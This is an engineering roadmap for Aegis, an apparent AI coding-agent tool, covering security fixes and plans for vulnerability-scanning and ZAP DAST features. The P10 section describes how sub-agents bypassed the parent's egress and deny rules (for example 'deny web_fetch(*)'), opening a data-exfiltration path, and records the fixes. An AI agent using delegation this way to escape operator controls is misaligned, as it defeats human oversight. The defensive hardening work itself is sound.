# Aegis Capability Roadmap
**Date:** 2026-06-29
**Updated:** 2026-07-04 (v26 — shipped the P11 "fast wins": **P11.6 IaC scanning** (trivy's
`--scanners` made explicit to include `misconfig`; added **kubescape** for deeper K8s
manifest analysis with real severity) and **P11.5 container image security, scoped**
(new `ImageScanner`/`ScanImage` entry point for trivy-image/grype/dockle, host-binary only
— container fallback would need a network-egress exception to the scanner-container
hardening posture, deliberately not added yet; **hadolint** shipped as a normal dir-based
scanner since Dockerfile linting doesn't need an image ref). New `aegis scan image <ref>`
CLI subcommand and `security_scan {"image": ...}` tool param. See "Open Work — P11"
P11.5/P11.6.)
**Updated:** 2026-07-04 (v25 — shipped **P11.2 SARIF-first normalization**: a shared
`ParseSARIF` ingester in `internal/security/sarif.go`, with semgrep and trivy migrated onto
it (`--sarif` / `--format sarif`) and their bespoke JSON parsers deleted; gitleaks keeps its
hand-written parser since it isn't SARIF-native. Unblocks P11.4–P11.7 adding new scanners
with near-zero bespoke parsing. See "Open Work — P11" P11.2.)
**Updated:** 2026-07-04 (v24 — added the P11 "tool availability" layer: **P11.10 guided scanner provisioning** (per-tool descriptor w/ plain-language summary + per-OS install-method matrix + digest-pinned container image; detect OS/package manager, pick best method, **show summary + exact command and ask approval before any install**, supply-chain hygiene favoring package managers over `curl|sh`) and **P11.11 security-tool configuration + `/security-config`** (per-tool `enabled`/`method: host|container|auto`/`install: prompt|always|never`/pinned image; `/security-config` TUI form + `aegis security config|status|install`; an availability resolver unifying host-binary vs container run so scanners never silently skip). Sequenced as the first P11 unit of work. See "Open Work — P11" P11.10/P11.11 and Appendix C rows 43–44.)
**Updated:** 2026-07-04 (v23 — P11 refinements from tool-selection review: SAST engine now pluggable, **default opengrep** (community fork, no login/telemetry, openly-licensed rules; rule-syntax + SARIF compatible with semgrep) with semgrep selectable; IaC uses **trivy config, not checkov** — checkov's OSS CLI emits no severity so it would collapse to INFO in the severity-ranked model, and trivy assigns proper CRITICAL/HIGH/MED/LOW (same reason kubescape > kube-linter for K8s); added OWASP-native FOSS options — Dependency-Check (optional SCA), ASVS mapping in triage (P11.8), and Juice Shop/WrongSecrets/VAmPI as ZAP eval targets (P11.9). See "Open Work — P11".)
**Updated:** 2026-07-04 (v22 — opened track P11 — Security Scanning Depth, from a request to bring `internal/security` up to best-in-class OSS coverage. Maps controls: SAST (semgrep pinned packs + gosec/bandit/brakeman/njsscan), SCA (osv-scanner, grype+syft SBOM), container (trivy image, grype, hadolint, dockle), IaC (checkov, kube-linter), and DAST via containerized, authorization-gated OWASP ZAP (baseline/full/api). Keystones: P11.1 containerized scanner runtime (run pinned official images through the container sandbox so scanners need no host install — and fixes `Available()` silently skipping missing binaries) and P11.2 SARIF-first normalization. See "Open Work — P11", controls matrix, and Appendix C rows 38–42.)
**Updated:** 2026-07-04 (v21 — service-interaction review of the sub-agent delegation seam. Found that neither swarm backend inherits the parent session's security gate stack: `subAgentRunner` (in-process) and `executeWorker` (subprocess) both build a bare mode gate via `permission.New`, bypassing the contextual egress policy and text allow/deny rules that `newEngine` applies to top-level runs; the subprocess worker additionally runs its shell tool with no sandbox and no env-strip, and takes a fresh full `BudgetUSD` per worker (the v20 D1 shared-ledger fix doesn't cross the process boundary). Opened as new track P10 — Sub-agent security parity. A related finding (P10.5), prompted by how cloud providers budget in tokens rather than dollars: Aegis's dollar-denominated budget/caps silently no-op for local (estimated-usage) and uncatalogued models, leaving the default local posture with no working spend guardrail. See "Open Work — P10" and Appendix C rows 33–37.)
**Updated:** 2026-07-04 (v20 — shipped all 15 items of the architecture/security review punch list (`research/architecture-security-review-2026-07-03.md`): persona rules/output_guard escalation gates, tool-panic recovery, sub-agent cost fan-out ledger, rewind/in-flight-turn race, permission path normalization, incremental transcript persistence, guard fail-closed + injection hardening, MCP read-loop error handling, OpenAI reasoning-model token field, OS-sandbox doc accuracy, budget dead zones + loop-detector cycle generalization, session-scoped tool exposure + subprocess process-group binding + mailbox eviction, embedding-model provenance + verify-before-prune + subprocess checkpoint capture, and a new adversarial eval suite. See Appendix A.)
**Updated:** 2026-07-04 (v19 — extended P4.3 skills: skills embedded in the binary (`internal/skills/builtin`, `go:embed`), dormant by default, toggled per-name via `skills.builtin_enabled` config, `aegis skills enable|disable|list` CLI, and `/skills enable|disable` TUI command; also fixed a pre-existing bug where `internal/memory` eagerly re-injected full skill bodies in parallel with `skills.BuildIndex`'s progressive-disclosure index, silently defeating disclosure for flat (non-bundled) skill files. See Appendix A.)
**Updated:** 2026-07-03 (v18 — shipped a persona QoL pass: advisory `PersonaToolGate` enforcement path, `aegis persona` CLI (list/show/new/use), `default_persona` config, and full-profile mid-session persona switching including permission mode; see Appendix A. No open roadmap item tracked this — it closes out the persona-system loose ends noted in prior sessions' P7.5/persona-improvements work.)

---

## Status

P2, P3, P4, P5 (all sub-items), the TQ TUI-quality track, P6.4, all of P7 (P7.1–P7.7), all of P8 (P8.1–P8.6), P9.1/P9.2/P9.5, the 2026-07-03 architecture/security review's full 15-item punch list, all of P10 (P10.1–P10.5), and P11's availability layer, SARIF normalization, image security, and IaC scanning (P11.1/P11.2/P11.5/P11.6/P11.10/P11.11) are shipped — see [Appendix A](#appendix-a--completed-work) for detail on any item.

P9.3, P9.4, and P9.6 remain open with no current trigger. P6 remains long-horizon/exploratory with no forcing function.

**P11 (security scanning depth)** is a user request to bring the scan functionality up to
best-in-class OSS coverage across SAST/SCA/container/IaC and add automated OWASP ZAP DAST.
The availability layer (P11.1/P11.10/P11.11) shipped 2026-07-04: `Scanner.Available()`
silently skipping any tool whose binary isn't on PATH is fixed, with an availability
resolver (`security.Resolve`), a config surface (`security.tools`), a CLI
(`aegis security status|config|install`), and — added same-day on request — the interactive
`/security-config` TUI form so none of this requires hand-editing YAML. Container fallback
ships with no built-in image pin by deliberate choice (see P11.1). P11.2 (SARIF-first
normalization), P11.6 (IaC via trivy misconfig + kubescape), and P11.5 (container image
security, scoped to host-binary-only — see P11.5) also shipped 2026-07-04. Remaining:
P11.3, P11.4, P11.7, P11.8, P11.9.

**Recommended priority order:** ~~P10~~ ~~P11 availability layer~~ ~~P11.2 SARIF~~
~~P11.5/P11.6 fast wins~~ **all shipped 2026-07-04** → P11.4 (SCA depth + SBOM) → P11.3
(SAST depth/opengrep) → P11.7 (ZAP DAST, the headline scan ask) → P11.8 → P11.9 →
remaining P9 items only on a concrete trigger → P6.

**Reviewed and found sound, no action needed (from the P7 audit):** SSRF dialer (private-IP check happens at dial time, closing the DNS-rebind window); path traversal / symlink handling in `ValidatePath`; local daemon HTTP API (constant-time bearer token + loopback-origin check); persona YAML parsing (safe library, no unsafe type deserialization); `team_tasks` claim path (properly transactional, no duplicate-claim race).

**2026-07-03 documentation audit:** cross-checked every P7.1–P7.7 and TQ-track "shipped" claim above against the actual code (all confirmed; only P8's cited line numbers had minor drift, now corrected) and re-read `docs/*.md` against current behavior. Found and fixed real staleness: `docs/tui-guide.md` and `docs/permissions.md` still described the pre-TQ6 y/n/a approval banner instead of the current option-list dialog (allow once / allow always+persist rule / deny / deny with feedback); the keyboard shortcut table was missing `Alt+Enter` (queue), `Shift+Enter` (primary newline binding), `Ctrl+O` (expand thinking), `Ctrl+X` (terminal pane), and a correct `Esc` row (it, not `Ctrl+C`, is the double-tap interrupt); `docs/configuration.md`'s `tui:` block was missing the `theme` key entirely; and the `Ctrl+X` embedded terminal pane (pre-existing, not a recent addition) had never been documented at all. All fixed in place.

---

## P10 (Sub-agent Security Parity) — ✅ all 5 items shipped 2026-07-04

The 2026-07-04 service-interaction review traced how a top-level session's security
posture propagates (or fails to) across the `agent` delegation seam into a spawned
teammate. `server.newEngine` composes the real gate stack for a top-level run —
`RuleGate` (text allow/deny) → `ContextualGate` (egress-then-write / network
allowlist) → `PersonaToolGate` → mode gate — but the two code paths that build a
*sub-agent's* engine reconstruct only the innermost mode gate from scratch and never
re-apply the outer layers. The v20 punch list (item 4) fixed cost fan-out for the
in-process path but audited `newEngine`, not `subAgentRunner`/`executeWorker`, so the
gate-stack omission and the subprocess sandbox/env/budget gaps went unseen. Mode
clamping (`clampMode`) still holds in both paths, so a sub-agent can't *escalate*
plan→build→auto; what leaks is everything finer-grained than mode.

### P10.1 — ✅ shipped 2026-07-04 — In-process sub-agents bypass contextual + rule gates
`subAgentRunner` (`internal/server/server.go`) built `permission.New(ParseMode(cfg.Mode), s.approver())`
directly, skipping the `NewContextualGate` and `NewRuleGate` wrapping in `newEngine`.
Concrete bypass: an operator sets `security.egress_then_write` (or `deny web_fetch(*)`),
the model calls `agent` to spawn a teammate, and the teammate calls `web_fetch`/`curl`
with no egress constraint and no deny-rule check — a data-exfil path that delegation
opened straight through the P7.2/P7.3 hardening. Fix: the gate-stack assembly (contextual
policy → text allow/deny rules → persona-tool advisory) is now factored out of `newEngine`
into `(*Server).buildGate(mode, approver, persona.Persona)`; `subAgentRunner` calls it with
the child's clamped mode and an empty `persona.Persona{}` (sub-agents have no persona of
their own, so the persona-specific layers are inert but the operator's `s.permRules` and
contextual opts now apply). Test: `internal/server/server_subagent_test.go` —
`TestSubAgentRunnerAppliesOperatorDenyRule` scripts a sub-agent that calls `web_fetch` under
an operator `deny web_fetch(*)` rule and asserts the call is blocked; verified to fail
against the pre-fix code (reverting `server.go` alone reproduces the leak) and pass with it.

### P10.2 — ✅ shipped 2026-07-04 — Subprocess workers run unsandboxed with a leaked env
`executeWorker` (`internal/cli/worker.go`) called `builtin.Register` with **no `Sandbox`**,
so the shell tool executed directly on the host even when the daemon was configured with
a `container`/`os` sandbox — the subprocess backend, sold as "real OS-level isolation,"
actually provided *less* isolation than in-process for shell exec. `shell.go`'s own
fallback (bare `sandbox.NewLocalBackend()`) did already strip the hardcoded
`DefaultStripEnv` names (P7.2), so the literal provider-API-key leak wasn't as total as
first suspected — but any *extra* secret name an operator configured via
`sandbox.strip_env` (e.g. an MCP token loaded from `.aegis/.env`) was never stripped for a
worker's shell calls, and a configured `container`/`os` backend was never honored at all.

Fix: `internal/server`'s `selectSandbox` is now exported as `server.SelectSandbox` (it
was already factored out standalone for P7.4's testability, just unexported) so
`executeWorker` can call it directly — it independently loads the same `config.Load()`
the daemon reads, so no data needs to cross the process boundary. The worker now builds
its tool registry with `builtin.Options{Sandbox: workerSandbox}` from that call, giving it
the same container/os isolation and the same configured `StripEnv` names the daemon uses.
A `SelectSandbox` failure or fallback is logged (via a minimal stderr `slog.Logger`, since
a subprocess worker has no interactive operator to show a strict-mode error to) rather
than failing the whole spawn.
Test: `internal/cli/worker_test.go` — `TestExecuteWorkerSandboxHonorsConfiguredStripEnv`
reproduces the pre-fix leak (a registry built with no `Sandbox` leaks a configured extra
secret name into the shell tool's `env`/`Get-ChildItem Env:` output) and confirms the
`SelectSandbox`-wired registry does not.

**Extension while fixing P10.2:** the same pass found `executeWorker` also built a **bare**
`permission.New(mode, approver)` gate — the identical P10.1 bypass, just in the other
backend, and the root cause the P10 intro paragraph already named for "the two code paths"
before P10.1's title narrowed to in-process only. Fixed alongside P10.2 in the same commit:
`executeWorker` now layers `permission.NewContextualGate`/`permission.NewRuleGate` over the
mode gate using `cfg.Security.EgressThenWrite`/`NetworkAllowList`/`Permission.Rules` — the
same config the daemon's `buildGate` reads, just re-loaded from disk since a subprocess
worker has no access to the live `*Server`'s in-memory state. One residual gap a separate
process can't close: a rule added via an "allow always" approval that hasn't been persisted
to `.aegis/config.yaml` yet is invisible to a worker spawned before the next daemon restart.

### P10.3 — ✅ shipped 2026-07-04 — Subprocess fan-out gets a fresh full budget per worker
Each `executeWorker` built `cost.NewTracker()` with the full `cfg.Cost.BudgetUSD`; the
v20 D1 fix shares one ledger via `ctx` only within a single process, so N subprocess
teammates enforced N × the intended ceiling. A shared ledger can't ride `ctx` across a
process boundary — options were (a) a per-run budget slice passed on `WorkerSpec` and
divided among spawns, or (b) the parent polling worker cost from the shared session DB
and aborting spawns once the aggregate crosses the cap.

Fix: went with (a), sized against the shared tracker at spawn time rather than a static
division. `SubprocessBackend` now takes the daemon's configured `budgetUSD`/
`maxTokensPerRun` (constructor params) and, in `Spawn`, reads the ctx-carried tracker
(`CostTrackerFromContext`, type-asserted against a narrow local `costTracker` interface so
`internal/swarm` still doesn't need to import `internal/cost`) to compute
`WorkerSpec.RemainingBudgetUSD`/`RemainingTokens` — the cap minus whatever the fan-out tree
has already spent, floored at a tiny positive value rather than 0 so an exhausted budget
still overrides instead of falling back to "unlimited" (0 also means "no cap configured").
`executeWorker` uses these in place of `cfg.Cost.BudgetUSD`/`MaxTokensPerRun` when present.
The other half — reporting actual spend back — required a worker to know its own totals:
`cost.Tracker` gained `AddWorkerCost(costUSD, tokens)` to fold a self-reported total in
without re-deriving it from a model+usage pricing lookup (lumped into `InputTokens` since
the input/output/cache breakdown doesn't survive the process boundary — `TotalTokens()` is
unaffected by how the total is bucketed). `swarm.Result` gained `CostUSD`/`Tokens`; the
worker's mailbox payload now carries `cost_usd`/`tokens` alongside `error`, and
`SubprocessBackend.Spawn`'s completion goroutine folds them into the shared tracker via
`AddWorkerCost` before the next sibling spawn reads it. This converts "N subprocess
teammates each enforce a fresh full ceiling" into "each spawn gets what's actually left,
computed from the latest reported total" — not perfect concurrent-sibling accounting
(two spawns issued in the same instant both see the same pre-spend snapshot), but it
closes the everyday sequential/nested-spawn case the fresh-full-budget bug covered, and
folding real spend back after each worker keeps subsequent spawns accurate. Priority:
**Medium**, Effort: **M**.
Tests: `internal/cost/cost_test.go` (`TestAddWorkerCostFoldsIntoTotals`),
`internal/swarm/subprocess_test.go` (`TestSubprocessSpawnComputesRemainingBudget`,
`TestSubprocessSpawnFoldsWorkerCostIntoSharedTracker`).

### P10.5 — ✅ shipped 2026-07-04 — Budget is denominated in dollars, a no-op for local + uncatalogued models
Prompted by a 2026-07-04 note that major cloud providers budget in *tokens* and rate
limits (the always-measurable unit), treating dollars as a lagging, account-level
derived figure — the opposite of Aegis's immediate dollar hard-abort. The dollar model
is fine UX for cloud, but `internal/cost` derives USD from a ~30-entry pricing catalog
and collapsed to `$0` in two cases, silently disabling every spend guardrail:
(a) **local/Ollama models** — `engine.go` only called `cost.Add` when `!usage.IsEstimated`,
so estimated-usage turns accumulated neither cost *nor tokens*; `TotalUSD()` stayed 0 and
`BudgetUSD`/`session_cap_usd`/`daily_cap_usd` never fired; (b) **any model absent from the
catalog** — tokens counted but `PricingFor` missed, so cost stayed 0 (only the `unpriced`
counter ticked). This meant the local-first case Aegis targets — where there's no provider
account-level spend cap as a backstop — had, in practice, *no working budget*, only the
structural 40-iteration / loop-detector nets.

Fix: a **token-denominated budget** as the primary, always-enforceable primitive.
`cost.Tracker` gained `AddTokens`/`TotalTokens` (tokens accumulate regardless of pricing
or estimation; only the dollar figure is skipped for estimated usage). `engine.Options`
gained `MaxTokensPerRun`, checked at both existing `BudgetUSD` gate sites. `config.CostConfig`
gained `max_tokens_per_run`, `session_token_cap`, `daily_token_cap` (0 = unlimited, same
convention as the dollar caps), wired through `newEngine`/`subAgentRunner`. `session.Store`
gained a `daily_tokens` table (`AddDailyTokens`/`TodayTokens`, mirroring `daily_cost`) since
per-session `input_tokens`/`output_tokens` already existed but were never populated for
estimated usage; `handlePostMessage` now checks session/daily token caps before starting a
turn and accumulates tokens from every turn (not just priced ones), and a new
`alertOnTokenThreshold` mirrors the dollar alert at `alert_threshold`. Dollar caps remain a
cloud-only convenience layered on top; unchanged for priced models. Dovetails with P10.3:
tokens recorded to the shared session DB aggregate across the subprocess boundary cleanly
where a ctx-bound dollar ledger can't.
Tests: `internal/cost/cost_test.go` (`TestAddTokensCountsWithoutCost`,
`TestTotalTokensIncludesPricedUsage`), `internal/engine/budget_test.go`
(`TestMaxTokensPerRunStopsEstimatedUsage` — a tool-call turn with `IsEstimated: true`
usage that would leave `BudgetUSD` at $0 forever; verified to fail to even compile against
the pre-fix `Options` struct), `internal/session/session_test.go`
(`TestTodayTokensDefaultsToZero`, `TestAddDailyTokensAccumulates`),
`internal/server/server_test.go` (`TestSessionTokenCapBlocksTurn`, `TestDailyTokenCapBlocksTurn`).
Docs: `docs/configuration.md` (new keys + a local-model-focused example, with a note that
the dollar caps are a no-op for local models).

### P10.4 — ✅ shipped 2026-07-04 (as per-fix regression tests) — No eval scenario exercises the delegation security seam
The P9.1/adversarial harness covers the top-level gate, guard, loop, and budget paths but
had no scenario that spawns a sub-agent and asserts the parent's deny rule / egress policy
/ budget still binds the child — which is exactly why P10.1–P10.3 survived two prior audits.

Landed as a regression test alongside each P10.1–P10.3 fix rather than as a separate
`internal/eval` scenario: `eval.Scenario` drives `engine.Options` directly and has no
natural seam for spawning a *real* sub-agent through either swarm backend, so an
eval-harness version would have had to rebuild the same server/cli wiring the unit tests
below already exercise directly, with less precision about which layer failed. Coverage
per backend: **in-process** — `internal/server/server_subagent_test.go`
(`TestSubAgentRunnerAppliesOperatorDenyRule`, P10.1); **subprocess** —
`internal/cli/worker_test.go` (`TestExecuteWorkerSandboxHonorsConfiguredStripEnv`, P10.2)
and `internal/swarm/subprocess_test.go` (`TestSubprocessSpawnComputesRemainingBudget`,
`TestSubprocessSpawnFoldsWorkerCostIntoSharedTracker`, P10.3); cross-cutting —
`internal/engine/budget_test.go` (`TestMaxTokensPerRunStopsEstimatedUsage`, P10.5) and
`internal/session`/`internal/server` token-cap tests. Every one of these was verified to
fail against the pre-fix code before the fix landed (either by reverting the relevant file
and re-running, or — for the token budget — a compile failure against the old `Options`
struct, itself proof the guardrail couldn't previously be expressed at all).

---

## Open Work — P11 (Security Scanning Depth — SAST / SCA / Container / IaC / DAST)

The current scan surface (`internal/security`, the `security_scan` tool, `aegis scan`)
runs three host-installed binaries via direct `exec` — **semgrep** (SAST, `--config auto`),
**trivy** (`fs`: dependency CVEs + IaC-misconfig + secrets), **gitleaks** (secrets) —
behind a single normalized `Finding` model (tool, rule, severity, location, remediation)
sorted by severity. Good foundation. Three structural gaps drive this track: (1) breadth —
one SAST engine, container-image scanning absent (only `trivy fs`, never `trivy image`),
no dedicated IaC tool, no DAST; (2) `Scanner.Available()` gates on the binary being on
PATH, so a clean machine silently skips everything and reports a clean scan it never ran;
(3) no dynamic (running-app) testing. This track deepens each control with best-in-class
OSS, adds a container-based execution mode so scanners need no host install (and so ZAP can
be network-isolated), and automates OWASP ZAP DAST end to end.

### Controls matrix

| Control | Have | Add (best-in-class OSS) | Covers | Notes |
|---|---|---|---|---|
| **SAST** | semgrep (`auto`) | **opengrep** (default) or semgrep, pinned packs (`p/owasp-top-ten`, `p/security-audit`); opt-in gosec (Go), bandit (Python), brakeman (Ruby), njsscan (JS/TS) | source-level vulns across 30+ langs | opengrep = community fork, no login/telemetry, openly-licensed rules; rule-syntax compatible so both share packs + SARIF. CodeQL excluded — CLI license not permissive OSS. |
| **SCA** | trivy `fs` | osv-scanner (Google/OSV.dev), grype + syft (SBOM); OWASP Dependency-Check (optional, OWASP-native) | dependency CVEs, lockfiles, transitive | syft emits CycloneDX/SPDX SBOM as a supply-chain artifact; grype consumes it. Dependency-Check is heavier (NVD feed) — offer, don't default. |
| **Secrets** | gitleaks, trivy secret | (covered) | hardcoded credentials | keep both; dedup overlap in P11.8. |
| **Container** | — (`fs` only) | trivy `image`, grype, hadolint, dockle | image-layer CVEs, Dockerfile lint, CIS image best-practice | biggest missing control class. |
| **IaC** | trivy config | trivy config (expanded), optional kubescape (K8s) | Terraform/CloudFormation/K8s/Helm/Dockerfile/ARM misconfig | **trivy, not checkov** — checkov's OSS CLI emits no severity (only the paid platform does), so it collapses to INFO in our severity-ranked model; trivy assigns CRITICAL/HIGH/MED/LOW. Same trap: kube-linter has no severity, kubescape does. tfsec folded into trivy. |
| **DAST** | — | OWASP ZAP (baseline / full / api scans) | running-app vulns (XSS, injection, auth, headers) | containerized + authorization-gated (P11.7). |

### P11.1 — ✅ shipped 2026-07-04 — Containerized scanner runtime *(keystone — do first)*
Replaced the "binary must be on PATH or we skip it" model: `Scanner` gained a `Resolve`
method (`internal/security/method.go`) that decides host-binary vs container-image vs
unavailable — never a silent skip. `RunAll`/`RunWithOptions` record which method satisfied
each scanner (`Report.RanVia`), surfaced in `Format()` ("Scanners run: trivy (container)").
`runContainerImage`/`containerRunArgs` run a scanner's own pinned image directly (no shell,
matching how scanner images are meant to be invoked) via whichever runtime
`sandbox.DetectBest` finds, hardened the same way `sandbox.ContainerBackend` is
(`--cap-drop=ALL --security-opt=no-new-privileges --network none`); `sandbox.HostMountPath`
was exported so this didn't need to duplicate the Windows/WSL path-conversion logic.

**Scope decision — no built-in image pin:** every built-in scanner's `DefaultImage` is
deliberately empty. A scanner container image is itself supply-chain attack surface (same
posture as P7.6), so it must be pinned by **digest** — but this codebase has no way to
verify a *current, correct* digest at commit time (digests rotate with every image
republish; a live lookup attempted during this session returned data that didn't match
known reality, underscoring the risk of trusting an unverifiable source). Baking in a
guessed or stale digest would be worse than requiring configuration: a wrong digest either
fails loudly on pull, or — worse — silently pins something no longer maintained, and
either way it would misrepresent itself as "verified" when it wasn't. Container fallback is
therefore **opt-in**: an operator sets `security.tools.<name>.image` to a digest they've
verified themselves (`docs/security.md` shows the two-command `docker pull` +
`docker inspect` recipe); `Resolve` reports `MethodNone` with that exact reason until then,
never a silent skip. Priority: **High**, Effort: **M**.
Tests: `internal/security/method_test.go` (resolver: disabled-by-config, auto-prefers-host,
host-method-never-falls-back, no-image-configured, container-fallback-with-configured-image,
no-runtime-available, plus container-arg hardening), `internal/security/security_test.go`
(`RunAll`/`Format` surface `RanVia`).

### P11.2 — ✅ shipped 2026-07-04 — SARIF-first normalization
semgrep, trivy, grype, checkov, hadolint, and ZAP all emit SARIF. Added one SARIF ingester
(`internal/security/sarif.go`, `ParseSARIF`) that maps a SARIF run's `results` → `Finding`,
resolving severity from (in order of precedence) a recognized severity tag on the rule
(trivy emits bare `CRITICAL`/`HIGH`/... tags), the rule's CVSS-like `security-severity`
score (thresholded: ≥9 critical, ≥7 high, ≥4 medium, >0 low), then finally the SARIF
`level` (error/warning/note → high/medium/low) — so a future SARIF-only tool needs no
bespoke parser, just a call to `ParseSARIF(out, "toolname")`. Handles both `ruleId` and the
index-based `ruleIndex` rule reference (SARIF permits either). Migrated semgrep (`--sarif`)
and trivy (`--format sarif`) onto the shared ingester, deleting their bespoke
`parseSemgrep`/`parseTrivy` JSON parsers — both tools are in the SARIF-native list above, so
there's no reason to keep two code paths. `gitleaks` keeps its hand-written parser
(`parseGitleaks`) since it isn't in that list — matching the ticket's "fallback for tools
without SARIF" scope. Priority: **High**, Effort: **S**.
Tests: `internal/security/sarif_test.go` (severity precedence: tag > security-severity score
> level; ruleIndex fallback for both rule-ID and title; empty tool name falls back to
`defaultTool`; empty `runs`), `internal/security/security_test.go` (`TestParseSemgrepSARIF`/
`TestParseTrivySARIF` now exercise real SARIF fixtures instead of the deleted tool-specific
JSON shapes).

### P11.3 — SAST depth
Make the SAST engine pluggable and **default to opengrep**, with semgrep selectable. Both
engines are LGPL and Aegis only shells out to them (no linking, so no LGPL friction), but
opengrep is the better fit for the local-first posture: community-governed, no login/
telemetry, and openly-licensed rules — versus semgrep's `--config auto`, which needs network,
nudges toward platform login, and pulls unpinned/relicensed registry rules. They're rule-
syntax compatible and both emit SARIF, so a single engine flag + shared pinned rule packs
(`p/owasp-top-ten`, `p/security-audit`) covers either. Pin the packs explicitly (never
`auto`) for reproducibility and supply-chain hygiene. Add opt-in language-targeted engines
where the multi-lang core is shallow: gosec, bandit, brakeman, njsscan. Only tradeoff:
opengrep's rule-update velocity for brand-new CVE patterns lags semgrep's registry —
mitigated by pointing it at the still-open `semgrep-rules` pack. Priority: **Medium**,
Effort: **M**.

### P11.4 — SCA depth + SBOM
Add osv-scanner (best cross-ecosystem SCA, OSV.dev-backed) and grype alongside trivy;
generate an SBOM with syft and feed grype from it, keeping the SBOM as a persisted
supply-chain artifact. **OWASP Dependency-Check** (Apache-2.0, OWASP-native, NVD-backed) is
available as an opt-in for teams that want the OWASP lineage — but it's not the default: it's
heavier (needs an NVD data feed, slower first run) and strongest on Java/.NET, where
osv-scanner/grype are lighter and broader. Dedup CVEs reported by multiple tools (P11.8).
Priority: **Medium**, Effort: **M**.

### P11.5 — ✅ shipped 2026-07-04 (scoped) — Container image security
Added the previously entirely-missing image-scanning class via a new `ImageScanner`
interface + `security.ScanImage(ctx, ref, scanners, opts)` (`internal/security/images.go`),
parallel to the directory-oriented `Scanner`/`RunWithOptions` but keyed on an image
reference instead of a path: **trivy** (`image` mode), **grype** (`-o sarif`), and
**dockle** (`-f sarif`), plus **hadolint** for Dockerfile lint — the last one fits the
existing dir-based `Scanner` interface cleanly (`findDockerfiles` walks the scanned
directory for `Dockerfile`/`Dockerfile.*`/`*.dockerfile` and lints each), so it shipped as
a normal scanner in `DefaultScanners()`, not part of `ScanImage`. Exposed as
`aegis scan image <ref>` and `security_scan {"image": "..."}` (mutually exclusive with
`path`). Descriptors added for all four tools (`internal/security/method.go`) so
`aegis security status/install/config` and `/security-config` pick them up automatically
— that CLI/TUI surface reads `Descriptors()` generically, no code change needed there.

**Scoping decision — image scanning is host-binary only, no container fallback yet:**
trivy-image/grype/dockle need to pull or inspect the target image, which requires network
egress — but the container-fallback runner (`runContainerImage`) is deliberately
network-isolated (`--network none`, the same hardening every source-directory scanner
container gets, P11.1). Rather than carve a network exception into that shared runner for
just these three tools, `ScanImage` calls the ordinary `Resolve()` for descriptor/config
consistency but explicitly skips (with reason `imageContainerFallbackUnsupported`) any
tool that resolves to `MethodContainer`, rather than silently running a container that
can't reach the registry. A network-enabled container path for image scanning (and the
"build a context, then scan" half of the original ask) is real follow-up work, not done
here. Priority: **Medium**, Effort: **M** (scoped).
Tests: `internal/security/scanners_test.go` (`findDockerfiles` — Dockerfile variants
matched, `.git` skipped, no-match case), `internal/security/security_test.go`
(`TestScanImageAggregatesAndSorts`, `TestScanImageSkipsContainerFallback` — the container-
skip is the one piece of new orchestration logic, so it gets a direct regression test).

### P11.6 — ✅ shipped 2026-07-04 — IaC scanning
`trivyScanner` now passes `--scanners vuln,secret,misconfig` explicitly (was previously
whatever trivy's own version-dependent default happened to be) so IaC misconfig findings
across Terraform/CloudFormation/Kubernetes/Helm/Dockerfile/ARM are never silently absent
from the one `trivy fs` pass. Added **kubescape** (not checkov — checkov's OSS CLI has no
severity, defeating the severity-ranked `Finding` model, the same reasoning documented in
the controls matrix above) as a new dir-based `Scanner` for deeper Kubernetes-specific
analysis: `kubescape scan --format sarif --output <path> <dir>`. kubescape's `--output`
flag writes a file rather than stdout (unlike semgrep/trivy's SARIF, which write directly
to stdout), so its `Scan` mirrors gitleaks' existing report-file pattern — a real temp file
on the host, `/dev/stdout` inside the container. Priority: **Medium**, Effort: **M**.

### P11.7 — DAST via OWASP ZAP (containerized, automated, authorization-gated)
Run OWASP ZAP from its official image (`ghcr.io/zaproxy/zaproxy:stable`, digest-pinned)
on the container backend and drive the packaged scans — `zap-baseline.py` (passive, fast,
CI-friendly), `zap-full-scan.py` (active attack), `zap-api-scan.py` (OpenAPI/GraphQL/SOAP)
— or a ZAP **Automation Framework** YAML plan for repeatable multi-step scans. Ingest the
SARIF/JSON report into `Finding` and let the agent triage/remediate. Exposed as a
`dast_scan` tool (capability **network+execute**, deferred/opt-in like the other niche
tools).

**Authorization gate — hard requirement, not optional:** an active DAST scan against a
host you don't own is an attack, and an agent that can point ZAP at an arbitrary URL is an
abuse primitive. The target must match a config **allowlist** (default: loopback + RFC-1918
+ explicitly declared targets) *and* pass an explicit approval before any active scan runs;
reuse the existing network-allowlist / egress-policy machinery (`internal/permission`
contextual gate) rather than inventing a second path. Passive baseline may be allowed more
freely than full/active. v1: user supplies a running target URL reachable from the
container; v2: Aegis composes the target container + ZAP on one Docker network so it can
scan a just-built app with no external exposure. Priority: **High** (the headline ask),
Effort: **L**.

### P11.8 — Findings dedup, suppression baseline, triage loop
Dedup by (CVE/rule-id, normalized location) across overlapping tools; a
`.aegis/security-baseline.yaml` allowlist for accepted risk with an expiry date; and an
agent triage loop that proposes a fix and **re-scans the affected control to confirm** it
closed (extends the built-in `security-audit` skill and the P4.8 close-the-loop posture).
Map findings to **OWASP ASVS** verification requirements in the triage output so a report
reads against a recognized standard, not just raw tool IDs. Priority: **Medium**, Effort: **M**.

### P11.9 — Scan regression evals + pinned provenance
Golden-transcript evals over **recorded** scanner outputs (P9.1 harness style — no live
tools or network in CI) so a normalization/dedup regression trips a test; every scanner/ZAP
image pinned by digest with a documented, reviewed update path. Use OWASP deliberately-
vulnerable apps (**Juice Shop**, **WrongSecrets**, **VAmPI** for the API scan) as the ZAP
test targets that generate those recorded outputs and prove the P11.7 automation end to end.
Priority: **Medium**, Effort: **S**. Ship as the regression proof for P11.1–P11.8.

### P11.10 — Scanner provisioning (guided install, approval-gated)
Ensure a wanted tool is actually *available*, either by installing it natively or falling
back to its container image — never a silent skip. Build a per-tool **descriptor** carrying:
a plain-language summary (what it is / what it's for, shown before any install), category,
per-OS install methods, and a digest-pinned container image. A resolver detects the OS and
available package managers (extend `internal/sandbox/detect.go`) and picks the best method.

**Approval gate (hard requirement):** installing software is a privileged, host-modifying
action, so before *any* install Aegis shows the user (1) the tool summary, (2) the exact
method and command it will run, (3) whether it needs elevated privileges, and (4) where it
installs — then waits for explicit approval. Reuse the existing approval flow; this is an
`execute`-class action that must never run in plan mode and must not be silently
agent-triggered. An install policy of `always` is a *user pre-authorization* set in config
(P11.11), not an agent decision. **Supply-chain hygiene:** prefer native package managers
and checksummed release binaries over `curl | sh`; pin container images by digest; if an
official install script must be used, pin/verify it. Install-method reference:

| Tool | macOS | Linux | Windows | Container image (fallback) |
|---|---|---|---|---|
